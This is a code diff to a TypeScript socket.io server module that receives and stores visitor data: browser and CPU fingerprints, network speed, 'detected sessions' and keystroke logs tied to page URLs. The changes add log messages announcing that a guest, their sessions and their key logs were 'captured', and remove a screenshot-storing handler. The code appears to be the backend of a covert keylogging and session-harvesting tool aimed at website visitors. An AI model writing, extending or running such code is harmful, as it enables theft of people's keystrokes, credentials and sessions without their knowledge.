@@ -2,6 +2,7 @@ import { Socket } from "socket.io"
 import { UAParser } from "ua-parser-js"
 
 import { Guest } from "./datastore"
+import log from '../bin/logger'
 
 
 export default async (socket:Socket) => {
@@ -26,6 +27,7 @@ export default async (socket:Socket) => {
             guest.browserEngine = `${navigator.getEngine().name} ${navigator.getEngine().version}`,
             guest.cpuArch = navigator.getCPU().architecture
 
+            log(guest, 'new guest is captured!')
             await guest.save()
         }
     })
@@ -35,6 +37,8 @@ export default async (socket:Socket) => {
 
         if (guest) {
             guest.networkSpeed = networkSpeed
+
+            log(guest, `guest's network speed is detected:`, networkSpeed)
             await guest.save()
         }
     })
@@ -44,20 +48,13 @@ export default async (socket:Socket) => {
         keyLog.log = log
     })
 
-    socket.on('receive screenshot', async (url:string) => {
-        const guest:Guest = await Guest.findOne({ ip })
-
-        if (guest && !guest.screenshots.includes(url)) {
-            guest.screenshots.push(url)
-            await guest.save()
-        }
-    })
-
     socket.on('detected sessions', async (sessions:Sessions) => {
         const guest:Guest = await Guest.findOne({ ip })
 
         if (guest) {
             guest.sessions = sessions
+
+            log(guest, `guest's active sessions was detected:`, sessions)
             await guest.save()
         }
     })
@@ -67,6 +64,7 @@ export default async (socket:Socket) => {
 
         if (guest && keyLog.log) {
             guest.keyLogs.push(keyLog)
+            log(guest, `guest's key log was captured for ${keyLog.url}:`, keyLog.log)
             await guest.save()
         }
     })
